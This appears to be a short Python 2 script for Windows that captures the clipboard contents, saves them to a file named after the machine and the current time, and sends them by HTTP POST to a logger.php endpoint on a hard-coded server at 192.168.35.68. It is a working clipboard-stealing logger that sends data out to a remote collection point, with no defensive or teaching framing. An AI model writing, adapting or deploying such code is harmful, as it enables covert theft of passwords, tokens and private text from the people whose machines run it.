# coding:utf-8
# pip install pywin32
import win32clipboard as clip
import requests
import time
import os


# Variables
date = time.strftime("%Y%m%d_%H%M")
pc_name = os.environ['COMPUTERNAME']
clip_name = pc_name + "_" + date + '.txt'



def get_clip():
    global data
    clip.OpenClipboard()
    data = clip.GetClipboardData()
    clip.CloseClipboard()
    print data
    f = open(clip_name, "a+")
    f.write(data)
    #f.close()
    return f


def send(f):
    # AVEC REQUESTS
    url = 'http://192.168.35.68:8080/logger.php?log=' + clip_name + data
    query = {'clipboard': data}
    res = requests.post(url, data=query)
    print(res.text)


send(get_clip())

